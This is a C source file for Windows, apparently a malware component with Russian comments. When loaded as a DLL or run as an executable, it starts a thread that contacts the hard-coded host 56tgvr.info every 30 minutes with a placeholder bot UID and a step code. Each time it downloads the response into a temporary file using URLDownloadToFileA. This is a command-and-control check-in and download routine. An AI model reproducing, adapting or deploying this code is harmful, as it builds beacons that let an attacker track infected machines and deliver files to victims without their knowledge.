#include <windows.h>
#include <URLMon.h>

#pragma comment(linker, "/ENTRY:MyMain" )



char UID[64] = "__PINGER_UID__";

DWORD WINAPI PingerProc(LPVOID)
{
	#ifdef RELEASEDLL
		char *URLFormat = "http://56tgvr.info/geter/index_.php?cmd=step&uid=%s&step=161%%5Fdp";
	#else
		char *URLFormat = "http://56tgvr.info/geter/index_.php?cmd=step&uid=%s&step=160%%5Fdp";
	#endif


	char FileName[MAX_PATH];
	char URL[1024];

	FileName[0] = 0;
	URL[0] = 0;

	wsprintfA(URL, URLFormat, UID);

	GetTempPathA(MAX_PATH, FileName);
	GetTempFileNameA(FileName, NULL, TRUE, FileName);

	
	while (true)
	{
		HRESULT R = URLDownloadToFileA(NULL, URL, FileName, 0, NULL);
		Sleep(1000 * 60 * 30);
	}
	ExitProcess(0);
	return 0;
}


#ifdef RELEASEDLL
// Работаем в библиотеке
BOOL APIENTRY MyMain( HMODULE hModule,
                      DWORD  ul_reason_for_call,
                      LPVOID lpReserved)
{
	if (ul_reason_for_call == DLL_PROCESS_ATTACH)
	{
		// Стартуем поток отсука
		DWORD lpThreadId; 
		CreateThread( NULL, NULL, PingerProc, NULL, NULL, &lpThreadId );
	}
	return TRUE;
}
#else
	int APIENTRY MyMain() 
	{
		return PingerProc(NULL);
	}

#endif